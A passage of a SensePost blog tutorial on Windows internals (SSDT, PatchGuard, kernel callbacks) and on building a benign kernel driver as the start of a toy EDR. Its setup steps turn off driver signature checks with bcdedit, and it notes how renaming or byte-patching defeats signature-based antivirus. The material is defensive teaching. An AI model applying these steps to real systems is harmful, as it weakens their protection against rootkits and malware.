src=\"https://sensepost.com/img/pages/blog/2024/sensecon-23-from-windows-drivers-to-an-almost-fully-working-edr/creeper_virus.png\" alt=\"\" class=\"wp-image-67703\"></a></figure></div>\n\n\n<p>Knowing that such programs could be created, smart people started working on security products that would be able to remove them. For example the &#x201C;Reaper&#x201D; whose only purposes was to delete the Creeper from infected hosts by moving across the ARPANET. Technically the Reaper was a worm itself, but a good one sort of&#x2026; This was the first anti-virus software but a lot more appeared in the late 1980s and they were all aiming the same goal: protecting computers from malware.</p>\n\n\n\n<h2 class=\"wp-block-heading\">II/ How did anti-virus protect computers ?</h2>\n\n\n\n<p>Back in the 90s, antivirus products were able to detect viruses in two ways:</p>\n\n\n\n<ol>\n<li>Via a simple heuristics:</li>\n</ol>\n\n\n\n<ul>\n<li>What is the name of the binary ?</li>\n\n\n\n<li>What is in the metadata (strings, comments&#x2026;)</li>\n</ul>\n\n\n\n<p>2. Via a signature which is calculated for each binary:</p>\n\n\n<div class=\"wp-block-image is-resized\">\n<figure class=\"aligncenter size-full\"><a href=\"https://sensepost.com/img/pages/blog/2024/sensecon-23-from-windows-drivers-to-an-almost-fully-working-edr/mimikatz_signatures.png\"><img loading=\"lazy\" decoding=\"async\" width=\"397\" height=\"164\" src=\"https://sensepost.com/img/pages/blog/2024/sensecon-23-from-windows-drivers-to-an-almost-fully-working-edr/mimikatz_signatures.png\" alt=\"\" class=\"wp-image-67704\"></a></figure></div>\n\n\n<p>When dropping the binary on disk, the anti-virus would check if its signature was known and categorised as malicious. If so, the binary was quarantined or deleted.</p>\n\n\n\n<p>For obvious reasons this was not enough because all of these detection methods are based on information that an attacker can manipulate. If you are blocking binaries called mimikatz.exe, I will just rename it notmimikatz.exe. If you are blocking binaries that contain a specific string, I will strip it! If you are flagging the signature of the binary, I&#x2019;ll change one byte in the binary and we are good to go. Static analysis was not enough.</p>\n\n\n\n<p>In order to detect viruses in a more sophisticated way, it was necessary to be able to analyse the system dynamically and specifically be aware of:</p>\n\n\n\n<ul>\n<li>Processes being created</li>\n\n\n\n<li>Libraries being loaded</li>\n\n\n\n<li>Files being modified</li>\n\n\n\n<li>Functions being called as well as the parameters they take</li>\n</ul>\n\n\n\n<p>If we take a look at how operating systems are architected, we can see that they rely on two spaces:</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-full\"><a href=\"https://sensepost.com/img/pages/blog/2024/sensecon-23-from-windows-drivers-to-an-almost-fully-working-edr/userspaceandkernelspace.png\"><img loading=\"lazy\" decoding=\"async\" width=\"629\" height=\"339\" src=\"https://sensepost.com/img/pages/blog/2024/sensecon-23-from-windows-drivers-to-an-almost-fully-working-edr/userspaceandkernelspace.png\" alt=\"\" class=\"wp-image-67705\"></a></figure></div>\n\n\n<p>The user space is where your processes live, where you manipulate a word file, where you call your friends on discord. Each process, running in the user space, has got its own execution environment which means that if discord crashes, word will still work. On the other side is the kernel space where the core of the operating system as well as services and drivers are running. Since the kernel space is where the kernel itself is running, it contains quite a bit of interesting information, stored in structures, useful to inspect. However, as you may have guesses, it is not possible for a user space program to access this information directly since the user space and kernel space are both isolated from each other:</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-full\"><a href=\"https://sensepost.com/img/pages/blog/2024/sensecon-23-from-windows-drivers-to-an-almost-fully-working-edr/userspace2kernelspacedirectly.png\"><img loading=\"lazy\" decoding=\"async\" width=\"630\" height=\"235\" src=\"https://sensepost.com/img/pages/blog/2024/sensecon-23-from-windows-drivers-to-an-almost-fully-working-edr/userspace2kernelspacedirectly.png\" alt=\"\" class=\"wp-image-67706\"></a></figure></div>\n\n\n<p>The only way of accessing these specific structures directly is running code in the kernel space itself and the easiest way of doing that, is via a kernel driver.</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-full\"><a href=\"https://sensepost.com/img/pages/blog/2024/sensecon-23-from-windows-drivers-to-an-almost-fully-working-edr/kerneldriverbeforepatchguard.png\"><img loading=\"lazy\" decoding=\"async\" width=\"625\" height=\"328\" src=\"https://sensepost.com/img/pages/blog/2024/sensecon-23-from-windows-drivers-to-an-almost-fully-working-edr/kerneldriverbeforepatchguard.png\" alt=\"\" class=\"wp-image-67707\"></a></figure></div>\n\n\n<p>One of the most heavily targeted structures was the SSDT (<strong>S</strong>ervice <strong>S</strong>ystem <strong>D</strong>ispatch <strong>T</strong>able). To understand why, we need to take a look at what the operating system does when you try to open a file. As a user, opening a file is nothing exceptional, you just double click on the file and a program (let&#x2019;s say notepad or word) would open the file for you. However in order to achieve such a task, the operating system had to go through quite a few steps which is described by the following schema:</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-full\"><a href=\"https://sensepost.com/img/pages/blog/2024/sensecon-23-from-windows-drivers-to-an-almost-fully-working-edr/windowsusertokernelspace.png\"><img loading=\"lazy\" decoding=\"async\" width=\"621\" height=\"771\" src=\"https://sensepost.com/img/pages/blog/2024/sensecon-23-from-windows-drivers-to-an-almost-fully-working-edr/windowsusertokernelspace.png\" alt=\"\" class=\"wp-image-67708\"></a></figure></div>\n\n\n<p>As you can see, user applications mostly rely on the WinAPI which consists of a set of developper-friendly functions documented by Microsoft and exposed by multiple DLL&#x2019;s such as kernel32.dll, user.dll or advapi.dll. So the first step to open a file, is to use the CreateFileA function exposed by the kernel32.dll, whose prototype is the following:</p>\n\n\n\n<pre class=\"wp-block-code\"><code>HANDLE CreateFileA(\n    LPCSTR                lpFileName,\n    DWORD                 dwDesiredAccess,\n    DWORD                 dwShareMode,\n    LPSECURITY_ATTRIBUTES lpSecurityAttributes,\n    DWORD                 dwCreationDisposition,\n    DWORD                 dwFlagsAndAttributes,\n    HANDLE                hTemplateFile\n);</code></pre>\n\n\n\n<p>Its usage is fully documented and the function is pretty easy to use, all you need to do is to specify the path to the file you want to open as well as the desired access on it (read, write or append). Looking at the execution flow of the CreateFileA function we&#x2019;ll see that, ultimately, it will call another function, NtCreateFile, exposed by the NTDLL.dll and whose prototype is the following:</p>\n\n\n\n<pre class=\"wp-block-code\"><code>__kernel_entry NTSTATUS NtCreateFile(\n    PHANDLE            FileHandle,\n    ACCESS_MASK        DesiredAccess,\n    POBJECT_ATTRIBUTES ObjectAttributes,\n    PIO_STATUS_BLOCK   IoStatusBlock,\n    PLARGE_INTEGER     AllocationSize,\n    ULONG              FileAttributes,\n    ULONG              ShareAccess,\n    ULONG              CreateDisposition,\n    ULONG              CreateOptions,\n    PVOID              EaBuffer,\n    ULONG              EaLength\n);</code></pre>\n\n\n\n<p>As you can see, the prototype of the NtCreateFile function is much more complicated than the one of the CreateFileA function. The reason is that the NTDLL.dll is in fact the user mode reflection of the functions exposed by the kernel itself. As such, the NTDLL.dll is going to add a few others parameters that are needed by the kernel to perform the task of opening a file which are not managed or controlled by the developer.</p>\n\n\n\n<p>Once all these parameters are set, the program will have to request the kernel to open the file. That means that the program will have to call the NtCreateFile function exposed by the kernel itself. At the beginning of this article I mentioned that a user space process can not directly access the kernel space, and that is true! However they can request the kernel to perform specific tasks. To request an such action, you will need to trigger a specific mechanism called a <strong>system call</strong>.</p>\n\n\n\n<p>Looking at the disassembly of the NtCreateFile from the NTDLL.dll function we can see the following:</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-full\"><a href=\"https://sensepost.com/img/pages/blog/2024/sensecon-23-from-windows-drivers-to-an-almost-fully-working-edr/ntcreatefiledisassembly.png\"><img loading=\"lazy\" decoding=\"async\" width=\"655\" height=\"168\" src=\"https://sensepost.com/img/pages/blog/2024/sensecon-23-from-windows-drivers-to-an-almost-fully-working-edr/ntcreatefiledisassembly.png\" alt=\"\" class=\"wp-image-67709\"></a></figure></div>\n\n\n<p>Two things are important. The first one is the second line:</p>\n\n\n\n<pre class=\"wp-block-code\"><code>mov eax, 55h</code></pre>\n\n\n\n<p>This line moves the value 55 in the EAX register. This value, 55, is called a <strong>system call number</strong>. Each function from the NTDLL.dll is linked to a specific system call number that varies between the different version of the Windows operating system. The second important line is the syscall instruction itself:</p>\n\n\n\n<pre class=\"wp-block-code\"><code>syscall</code></pre>\n\n\n\n<p>This instruction is the one that will tell the CPU to switch from the user space to the kernel space and then jump on the kernel address where the NtCreateFile function is located in the kernel. The thing is, the CPU doesn&#x2019;t know where the NtCreateFile function is located. In order to find the address of the function, it will need both the system call number, stored in the EAX register, and the SSDT. Why the SSDT ? Because this structure is an index that contains a list of system call numbers as well as the location of the corresponding hexadecimal address of the function in the kernel:</p>\n\n\n\n<figure class=\"wp-block-table\"><table><tbody><tr><td>Function</td><td>System call number</td><td>Kernel address pointer</td></tr><tr><td>NtCreateFile</td><td>55</td><td>0x5ea54623</td></tr><tr><td>NtCreateIRTimer</td><td>ab</td><td>0x6bcd1576</td></tr><tr><td>&#x2026;</td><td>&#x2026;</td><td>&#x2026;</td></tr></tbody></table></figure>\n\n\n\n<p>So when the CPU triggers the syscall, it looks into this structure for the syscall number 55 and jumps on the address linked to this system call number. The following schema sums up the entire process of opening a file on the Windows operating system:</p>\n\n\n<div class=\"wp-block-image is-resized\">\n<figure class=\"aligncenter size-full\"><a href=\"https://sensepost.com/img/pages/blog/2024/sensecon-23-from-windows-drivers-to-an-almost-fully-working-edr/usertokerneltransition.png\"><img loading=\"lazy\" decoding=\"async\" width=\"567\" height=\"478\" src=\"https://sensepost.com/img/pages/blog/2024/sensecon-23-from-windows-drivers-to-an-almost-fully-working-edr/usertokerneltransition.png\" alt=\"\" class=\"wp-image-67710\"></a></figure></div>\n\n\n<p>Once the kernel receives the request, it will request a driver (the hard disk driver in our case) to read the content of the file stored on the hard disk which, in the end, will allow notepad to print its content back to you.</p>\n\n\n\n<p>Looking back at the SSDT, it appears that if you modify the address of the kernel functions, you can basically redirect the code flow pretty much anywhere you want. For that reason security tool authors started patching the SSDT in order to redirect calls to their own drivers so that they can analyse which functions are called together with their arguments:</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-full\"><a href=\"https://sensepost.com/img/pages/blog/2024/sensecon-23-from-windows-drivers-to-an-almost-fully-working-edr/ssdtpatching.png\"><img loading=\"lazy\" decoding=\"async\" width=\"569\" height=\"510\" src=\"https://sensepost.com/img/pages/blog/2024/sensecon-23-from-windows-drivers-to-an-almost-fully-working-edr/ssdtpatching.png\" alt=\"\" class=\"wp-image-67711\"></a></figure></div>\n\n\n<p>This way, leveraging their own drivers, defenders were able to analyse system calls and determine whether or not it is legitimate or malicious.</p>\n\n\n\n<p>The SSDT structure is simple, making manipulation of it relatively safe. However, modifying other more complicated kernel structures can be a perilous task. In kernel space, if the code you run is bugged, the entire kernel may crash. Moreover, if the code contains a logic bug or memory-based vulnerability (such as a stack overflow), an attacker could exploit them in order to run code directly in kernel space (as the most privileged user on the system). Lastly, if defenders are able to use kernel drivers to access the kernel and modify its behaviour, so can attackers with rootkits.</p>\n\n\n\n<p>In order to protect the Operating System both from intrusive modifications made by an anti-virus and from attackers, Microsoft created KPP (<strong>K</strong>ernel <strong>P</strong>atch <strong>P</strong>rotection) more commonly referred to as PatchGuard and released it with Windows XP/2003.</p>\n\n\n\n<p>PatchGuard is an active security mechanism that periodically checks the state of multiple critical Windows kernel structures. If one of these structures are modified by anything other than legitimate kernel code then PatchGuard emits a fatal system error (know as &#x201C;bug check&#x201D;) which will trigger a reboot of the computer:</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-full\"><a href=\"https://sensepost.com/img/pages/blog/2024/sensecon-23-from-windows-drivers-to-an-almost-fully-working-edr/kernel_security_check_failure.png\"><img loading=\"lazy\" decoding=\"async\" width=\"577\" height=\"380\" src=\"https://sensepost.com/img/pages/blog/2024/sensecon-23-from-windows-drivers-to-an-almost-fully-working-edr/kernel_security_check_failure.png\" alt=\"\" class=\"wp-image-67712\"></a></figure></div>\n\n\n<p>As a result, PatchGuard was preventing modification of critical kernel structures from other components that the kernel itself. With the release of PatchGuard it was no longer possible for an anti-virus to hook the SSDT or any critical structures in the kernel:</p>\n\n\n<div class=\"wp-block-image is-resized\">\n<figure class=\"aligncenter size-full\"><a href=\"https://sensepost.com/img/pages/blog/2024/sensecon-23-from-windows-drivers-to-an-almost-fully-working-edr/patchguard.png\"><img loading=\"lazy\" decoding=\"async\" width=\"439\" height=\"487\" src=\"https://sensepost.com/img/pages/blog/2024/sensecon-23-from-windows-drivers-to-an-almost-fully-working-edr/patchguard.png\" alt=\"\" class=\"wp-image-67713\"></a></figure></div>\n\n\n<p>Obviously security tool editors went mad since it basically disabled pretty much all of their tools and some of them even tried to sue Microsoft.</p>\n\n\n\n<p>To solve this issue and allow security products to monitor the system again, Microsoft added new functions to its OS that rely on a new mechanism called a <strong>callback object</strong>. Below is the definition of a callback object given by Microsoft:</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-full\"><a href=\"https://sensepost.com/img/pages/blog/2024/sensecon-23-from-windows-drivers-to-an-almost-fully-working-edr/callback_objects.png\"><img loading=\"lazy\" decoding=\"async\" width=\"863\" height=\"199\" src=\"https://sensepost.com/img/pages/blog/2024/sensecon-23-from-windows-drivers-to-an-almost-fully-working-edr/callback_objects.png\" alt=\"\" class=\"wp-image-67714\"></a></figure></div>\n\n\n<p>Basically these functions allow a kernel driver to be notified by the kernel each time a specific action is processed. As such, it permits software (like an EDR) to dynamically monitor what is happening on the system.</p>\n\n\n\n<p>This mechanism is the first one we are going to implement in our EDR, but before we get to that we will need a kernel driver and thus we&#x2019;ll need to have a better understanding of what a driver is and how we can develop one.</p>\n\n\n\n<h2 class=\"wp-block-heading\">III/ What is a driver ?</h2>\n\n\n\n<p>A driver is defined as a component that provides a software interface to a hardware device. A typical driver example would be the keyboard driver which translates electrical signal received from your keyboard inputs into a character that will be printed on your screen:</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-large\"><a href=\"https://sensepost.com/img/pages/blog/2024/sensecon-23-from-windows-drivers-to-an-almost-fully-working-edr/keyboarddriver.png\"><img loading=\"lazy\" decoding=\"async\" width=\"1024\" height=\"254\" src=\"https://sensepost.com/img/pages/blog/2024/sensecon-23-from-windows-drivers-to-an-almost-fully-working-edr/keyboarddriver-1024x254.png\" alt=\"\" class=\"wp-image-67715\"></a></figure></div>\n\n\n<p>There are a lot of different drivers used on a system, for example the Bluetooth driver, the keyboard driver, the mouse driver and even the network input/output driver that is responsible for translating electrical signals into network packets that can be understood by the system.</p>\n\n\n\n<p>If you want to take a look at the drivers that are running on your system, you can use the <a href=\"https://learn.microsoft.com/en-us/sysinternals/downloads/winobj\">WinObj.exe tool from the SysInternals toolkit</a>:</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-full\"><a href=\"https://sensepost.com/img/pages/blog/2024/sensecon-23-from-windows-drivers-to-an-almost-fully-working-edr/winobjdrivers.png\"><img loading=\"lazy\" decoding=\"async\" width=\"603\" height=\"545\" src=\"https://sensepost.com/img/pages/blog/2024/sensecon-23-from-windows-drivers-to-an-almost-fully-working-edr/winobjdrivers.png\" alt=\"\" class=\"wp-image-67716\"></a></figure></div>\n\n\n<p>Microsoft provides a lot of drivers samples on their <a href=\"https://github.com/microsoft/Windows-driver-samples\">Github repository</a> if you want to take a look at what the code of a driver looks like. You&#x2019;ll soon realise that developing a driver is pretty complicated. As mentioned before, the smallest memory bug will crash the driver and thus the kernel. Because of this Microsoft provides a few frameworks that makes kernel driver development easier.</p>\n\n\n\n<p>The main framework is called WDF (<strong>W</strong>indows <strong>D</strong>river <strong>F</strong>ramework) and is composed of two different sub-frameworks:</p>\n\n\n\n<ul>\n<li>KMDF (<strong>K</strong>ernel-<strong>M</strong>ode <strong>D</strong>river <strong>F</strong>ramework)</li>\n\n\n\n<li>UMDF (<strong>U</strong>ser-<strong>M</strong>ode <strong>D</strong>river <strong>F</strong>ramework)</li>\n</ul>\n\n\n\n<p>Both these drivers have their pro&#x2019;s and con&#x2019;s:</p>\n\n\n\n<figure class=\"wp-block-table\"><table><tbody><tr><td>Framework</td><td>Pro&#x2019;s</td><td>Con&#x2019;s</td></tr><tr><td>KMDF</td><td>Gives full access to the kernel</td><td>Is difficult to develop</td></tr><tr><td>UMDF</td><td>Is easy to develop</td><td>Gives access to limited functions</td></tr></tbody></table></figure>\n\n\n\n<p>Before you start developing a driver, you will have to determine what your needs are and what your driver will be used for. In our case, sadly, we&#x2019;ll need to develop a kernel driver (KMDF) since we will use kernel functions and to develop a driver we will need a development environment!</p>\n\n\n\n<h2 class=\"wp-block-heading\">IV/ Setting up a development environment</h2>\n\n\n\n<p>First things first, we will need to install Visual Studio, the SDK and the Windows Driver Kit. This is unfortunately a bit of a painful process, and depends on the version of Windows that you are running. At the time of this article, for Windows 10, you can follow <a href=\"https://learn.microsoft.com/en-us/windows-hardware/drivers/download-the-wdk\" target=\"_blank\" rel=\"noreferrer noopener\">this procedure</a> in order to install every necessary component. Note even though it mentions Windows 11 it also works for Windows 10. Next we will have to install an additional Spectre library using the Visual Studio installer:</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-full\"><a href=\"https://sensepost.com/img/pages/blog/2024/sensecon-23-from-windows-drivers-to-an-almost-fully-working-edr/image-59.png\"><img loading=\"lazy\" decoding=\"async\" width=\"687\" height=\"462\" src=\"https://sensepost.com/img/pages/blog/2024/sensecon-23-from-windows-drivers-to-an-almost-fully-working-edr/image-59.png\" alt=\"\" class=\"wp-image-72065\"></a></figure></div>\n\n\n<p>Alternatively, if you don&#x2019;t care about Spectre mitigations (which probably doesn&#x2019;t matter for this test), or are having trouble with getting the versions right in Visual Studio, then you can disable it in the project properties.</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-full\"><a href=\"https://sensepost.com/img/pages/blog/2024/sensecon-23-from-windows-drivers-to-an-almost-fully-working-edr/disablespectremitigation.png\"><img loading=\"lazy\" decoding=\"async\" width=\"880\" height=\"425\" src=\"https://sensepost.com/img/pages/blog/2024/sensecon-23-from-windows-drivers-to-an-almost-fully-working-edr/disablespectremitigation.png\" alt=\"\" class=\"wp-image-67718\"></a></figure></div>\n\n\n<p>Next, in preparation for loading our own driver, we will disable the Operating Systems driver signing check. In an elevated command line prompt, type the following command:</p>\n\n\n\n<pre class=\"wp-block-code\"><code>bcdedit /set testsigning on\nbcdedit -debug on</code></pre>\n\n\n\n<p>The reason why we need to do that is because since Windows 10 version 1507, it is no longer possible to load drivers that are not signed by Microsoft itself to help prevent rootkits. These commands simply disable the signing check and enable debug mode which will allow us to load our driver and debug it using WinDbg. Lastly we&#x2019;ll need to enable the output of kernel messages to the debugger. To do so we&#x2019;ll have to add the following key:</p>\n\n\n\n<pre class=\"wp-block-code\"><code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manage\\Debug Print Filter</code></pre>\n\n\n\n<p>With the value 0xf:</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-full\"><a href=\"https://sensepost.com/img/pages/blog/2024/sensecon-23-from-windows-drivers-to-an-almost-fully-working-edr/enabledebugmessages.png\"><img loading=\"lazy\" decoding=\"async\" width=\"696\" height=\"519\" src=\"https://sensepost.com/img/pages/blog/2024/sensecon-23-from-windows-drivers-to-an-almost-fully-working-edr/enabledebugmessages.png\" alt=\"\" class=\"wp-image-67719\"></a></figure></div>\n\n\n<p>Now reboot your computer. Open Visual Studio and create a new project &#x201C;Kernel Mode Driver, Empty&#x201D;:</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-full\"><a href=\"https://sensepost.com/img/pages/blog/2024/sensecon-23-from-windows-drivers-to-an-almost-fully-working-edr/kmdf.png\"><img loading=\"lazy\" decoding=\"async\" width=\"692\" height=\"534\" src=\"https://sensepost.com/img/pages/blog/2024/sensecon-23-from-windows-drivers-to-an-almost-fully-working-edr/kmdf.png\" alt=\"\" class=\"wp-image-67720\"></a></figure></div>\n\n\n<p>Once created, you should get the following project structure:</p>\n\n\n<div class=\"wp-block-image is-resized\">\n<figure class=\"aligncenter size-full\"><a href=\"https://sensepost.com/img/pages/blog/2024/sensecon-23-from-windows-drivers-to-an-almost-fully-working-edr/empty_project.png\"><img loading=\"lazy\" decoding=\"async\" width=\"234\" height=\"282\" src=\"https://sensepost.com/img/pages/blog/2024/sensecon-23-from-windows-drivers-to-an-almost-fully-working-edr/empty_project.png\" alt=\"\" class=\"wp-image-67721\"></a></figure></div>\n\n\n<p>Create a new source file, name it &#x201C;driver.c&#x201D; and add the following content (I&#x2019;ll get back to what it does later):</p>\n\n\n\n<pre class=\"wp-block-code\"><code>#include &lt;Ntifs.h&gt;\n#include &lt;ntddk.h&gt;\n#include &lt;wdf.h&gt;\n\n// Global variables\nUNICODE_STRING DEVICE_NAME = RTL_CONSTANT_STRING(L&quot;\\\\Device\\\\MyDumbEDR&quot;); // Driver device name\nUNICODE_STRING SYM_LINK = RTL_CONSTANT_STRING(L&quot;\\\\??\\\\MyDumbEDR&quot;);        // Device symlink\n\nvoid UnloadMyDumbEDR(_In_ PDRIVER_OBJECT DriverObject) {\n    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, &quot;MyDumbEDR: Unloading routine called\\n&quot;);\n    // Delete the driver device \n    IoDeleteDevice(DriverObject-&gt;DeviceObject);\n    // Delete the symbolic link\n    IoDeleteSymbolicLink(&amp;SYM_LINK);\n}\n\nNTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath) {\n    // Prevent compiler error in level 4 warnings\n    UNREFERENCED_PARAMETER(RegistryPath);\n\n    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, &quot;MyDumbEDR: Initializing the driver\\n&quot;);\n\n    // Variable that will store the output of WinAPI functions\n    NTSTATUS status;\n\n    // Initializing a device object and creating it\n    PDEVICE_OBJECT DeviceObject;\n    UNICODE_STRING deviceName = DEVICE_NAME;\n    UNICODE_STRING symlinkName = SYM_LINK;\n    status = IoCreateDevice(\n        DriverObject,\t\t    // Our driver object\n        0,\t\t\t\t\t    // Extra bytes needed (we don&apos;t need any)\n        &amp;deviceName,            // The device name\n        FILE_DEVICE_UNKNOWN,    // The device type\n        0,\t\t\t\t\t    // Device characteristics (none)\n        FALSE,\t\t\t\t    // Sets the driver to not exclusive\n        &amp;DeviceObject\t\t    // Pointer in which is stored the result of IoCreateDevice\n    );\n\n    if (!status) {\n        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, &quot;MyDumbEDR: Device creation failed\\n&quot;);\n        return status;\n    }\n\n    // Creating the symlink that we will use to contact our driver\n    status = IoCreateSymbolicLink(\n        &amp;symlinkName, // The symbolic link name\n        &amp;deviceName   // The device name\n    );\n\n    if (!NT_SUCCESS(status)) {\n        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, &quot;MyDumbEDR: Symlink creation failed\\n&quot;);\n        IoDeleteDevice(DeviceObject);\n        return status;\n    }\n\n    // Setting the unload routine to execute\n    DriverObject-&gt;DriverUnload = UnloadMyDumbEDR;\n\n    return status;\n}</code></pre>\n\n\n\n<p>In the project properties, go to &#x201C;Linker &gt; Command Line&#x201D; and add the following option which is going to disable the integrity check:</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-full\"><a href=\"https://sensepost.com/img/pages/blog/2024/sensecon-23-from-windows-drivers-to-an-almost-fully-working-edr/linkerintegritycheck.png\"><img loading=\"lazy\" decoding=\"async\" width=\"774\" height=\"540\" src=\"https://sensepost.com/img/pages/blog/2024/sensecon-23-from-windows-drivers-to-an-almost-fully-working-edr/linkerintegritycheck.png\" alt=\"\" class=\"wp-image-67722\"></a></figure></div>\n\n\n<p>At this point the environment is ready to build the driver. Compile the project and launch the following commands in a admin command line (obviously adjust paths and names as needed):</p>\n\n\n\n<pre class=\"wp-block-code\"><code>sc.exe create MyDumbEDR type=kernel binPath=C:\\\\Users\\windev\\Desktop\\x64\\Debug\\MyDumbEDR.sys\nsc.exe start MyDumbEDR</code></pre>\n\n\n\n<p>Here is the output you&#x2019;ll receive on your command line:</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-large\"><a href=\"https://sensepost.com/img/pages/blog/2024/sensecon-23-from-windows-drivers-to-an-almost-fully-working-edr/driver_running.png\"><img loading=\"lazy\" decoding=\"async\" width=\"1024\" height=\"259\" src=\"https://sensepost.com/img/pages/blog/2024/sensecon-23-from-windows-drivers-to-an-almost-fully-working-edr/driver_running-1024x259.png\" alt=\"\" class=\"wp-image-67723\"></a></figure></div>\n\n\n<p>And if you have got dbgview opened you should see your driver saying hello:</p>\n\n\n\n<iframe style=\"aspect-ratio: 16 / 9; height: auto; width: 100%;\" src=\"https://www.youtube.com/embed/sa9zQhB5CsU?si=yDR4bYDXePnJvkF5\" title=\"YouTube video player\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share\" allowfullscreen></iframe>\n\n\n\n<p>Perfect! Now that the driver is running, let&#x2019;s take a look at the content of a basic Windows kernel driver!</p>\n\n\n\n<h2 class=\"wp-block-heading\">V/ Developping a Windows kernel driver</h2>\n\n\n\n<p>A driver, like any binaries, is composed of a main function called a <strong>DriverEntry</strong> that has the following prototype:</p>\n\n\n\n<pre class=\"wp-block-code\"><code>NTSTATUS DriverEntry(\n    PDRIVER_OBJECT  DriverObject,\n    PUNICODE_STRING RegistryPath\n);</code></pre>\n\n\n\n<p>With:</p>\n\n\n\n<ul>\n<li>DriverObject: a pointer to a structure that contains the driver&#x2019;s information, below is the content of this structure:</li>\n</ul>\n\n\n\n<pre class=\"wp-block-code\"><code>//0x150 bytes (sizeof)\nstruct _DRIVER_OBJECT\n{\n    SHORT Type;                                                                    //0x0\n    SHORT Size;                                                                    //0x2\n    struct _DEVICE_OBJECT* DeviceObject;                                           //0x8\n    ULONG Flags;                                                                   //0x10\n    VOID* DriverStart;                                                             //0x18\n    ULONG DriverSize;                                                              //0x20\n    VOID* DriverSection;                                                           //0x28\n    struct _DRIVER_EXTENSION* DriverExtension;                                     //0x30\n    struct _UNICODE_STRING DriverName;                                             //0x38\n    struct _UNICODE_STRING* HardwareDatabase;                                      //0x48\n    struct _FAST_IO_DISPATCH* FastIoDispatch;                                      //0x50\n    LONG (*DriverInit)(struct _DRIVER_OBJECT* arg1, struct _UNICODE_STRING* arg2); //0x58\n    VOID (*DriverStartIo)(struct _DEVICE_OBJECT* arg1, struct _IRP* arg2);         //0x60\n    VOID (*DriverUnload)(struct _DRIVER_OBJECT* arg1);                             //0x68\n    LONG (*MajorFunction[28])(struct _DEVICE_OBJECT* arg1, struct _IRP* arg2);     //0x70\n}; </code></pre>\n\n\n\n<ul>\n<li>RegistryPath: a pointer to a unicode string containing the path to the driver&#x2019;s parameters key which is usually located under the following registry key:</li>\n</ul>\n\n\n\n<pre class=\"wp-block-code\"><code>HKLM:\\SYSTEM\\CurrentControlSet\\Service</code></pre>\n\n\n\n<p>If we take a look at content of the DriverEntry&#x2019;s function, we can see that, apart from the DbgPrintEx functions used to print messages in dbgview, two functions are called:</p>\n\n\n\n<ul>\n<li>IoCreateDevice: used to create a device object representing our driver</li>\n\n\n\n<li>IoCreateSymbolicLink: used to create the symbolic link that we will use to contact our driver</li>\n</ul>\n\n\n\n<p>These functions are the mandatory ones that we need to specify in order to load a driver on the system.</p>\n\n\n\n<p>The second important line specifies a routine to run when the driver is unloaded:</p>\n\n\n\n<pre class=\"wp-block-code\"><code>DriverObject-&gt;DriverUnload = UnloadMyDumbEDR;</code></pre>\n\n\n\n<p>In our code, the routine is the following function:</p>\n\n\n\n<pre class=\"wp-block-code\"><code>void UnloadMyDumbEDR(_In_ PDRIVER_OBJECT DriverObject) {\n    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, &quot;MyDumbEDR: Unloading routine called\\n&quot;);\n    // Delete the driver device \n    IoDeleteDevice(DriverObject-&gt;DeviceObject);\n    // Delete the symbolic link\n    IoDeleteSymbolicLink(&amp;SYM_LINK);\n}</code></pre>\n\n\n\n<p>As you can see this is the exact opposite of the loading routine, it deletes the device as well as the symbolic link. And that&#x2019;s it, at this point we have got a working kernel driver. It does nothing yet but it runs so let&#x2019;s implement one of the first mechanisms used by EDR&#x2019;s to monitor the system: callback objects!</p>\n\n\n\n<h2 class=\"wp-block-heading\">VI/ Implement function callback</h2>\n\n\n\n<p>As we have seen before, function callbacks are functions that can be used by a driver to register what is called a kernel callback. The underlying idea of a kernel callback is that, each time a particular action is done on the system, the kernel will inform the driver that registered the callback, that an action is being performed.</p>\n\n\n\n<p>To register such kernel callback, you can use a function callback that will allow you to monitor for specific events. The most well known function callbacks are:</p>\n\n\n\n<ul>\n<li>PsSetCreateProcessNotifyRoutine: used to monitor process creation</li>\n\n\n\n<li>PsSetLoadImageNotifyRoutine: used to monitor DLL loading</li>\n\n\n\n<li>PsSetThreadCreateNotifyRoutine: used to monitor thread creation</li>\n\n\n\n<li>ObRegisterCallbacks: used to monitor calls to the OpenProcess, OpenThread and OpenDesktop functions</li>\n\n\n\n<li>CmRegisterCallbacks: used to monitor the creation, modification and deletion of a registry key.</li>\n\n\n\n<li>IoRegisterShutdown: monitor the shutdown of the computer?</li>\n\n\n\n<li>IoRegisterFsRegistrationChange: monitor the modification of a file</li>\n</ul>\n\n\n\n<p>Below you will find a schema that sums up the process of registering a function callback in order to monitor for process creation:</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-full\"><a href=\"https://sensepost.com/img/pages/blog/2024/sensecon-23-from-windows-drivers-to-an-almost-fully-working-edr/kernelcallback.png\"><img 